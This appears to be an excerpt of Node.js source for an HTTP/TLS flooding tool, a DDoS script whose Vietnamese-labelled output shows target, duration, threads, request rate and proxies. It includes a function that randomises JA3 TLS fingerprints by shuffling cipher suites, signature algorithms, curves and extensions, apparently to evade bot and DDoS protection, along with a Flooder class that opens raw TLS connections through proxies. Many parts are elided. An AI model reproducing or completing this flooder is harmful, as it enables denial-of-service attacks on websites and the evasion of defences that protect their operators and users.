...
function generateJA3Fingerprint() {
    ...
    const extensions = [
        '0', '5', '10', '11', '13', '15', '16', '18', '23', '27', '35', '43', '45', '51', '65281', '17513'
    ];

    const shuffledCiphers = shuffle([...ciphers]).slice(0, Math.floor(Math.random() * 4) + 8);
    const shuffledSigAlgs = shuffle([...signatureAlgorithms]).slice(0, Math.floor(Math.random() * 3) + 4);
    const shuffledCurves = shuffle([...curves]);
    const shuffledExtensions = shuffle([...extensions]).slice(0, Math.floor(Math.random() * 4) + 12);
...
class Flooder {
    ...
    async initialize() {
        ...
        console.log(`Mục tiêu: ${this.target.href.green}\nThời gian: ${this.duration / 1000}s.yellow\nThread: ${this.threads.toString().yellow}\nRequest: ${this.rate.toString().yellow}/s\nProxy: ${this.proxies.length.toString().yellow}`);
    }
        ...
        const runFlooder = async () => {
            ...
            try {
                ...
                const tlsConn = tls.connect({
                    ...
                    sessionIdContext: sessionId.toString('hex'),
...
if (process.argv.length < 7) {
    console.log(`Mục tiêu: https://example.com\nThời gian: 60s\nThread: 4\nRequest: 10/s\nProxy: 100`.yellow);
    process.exit(1);
}
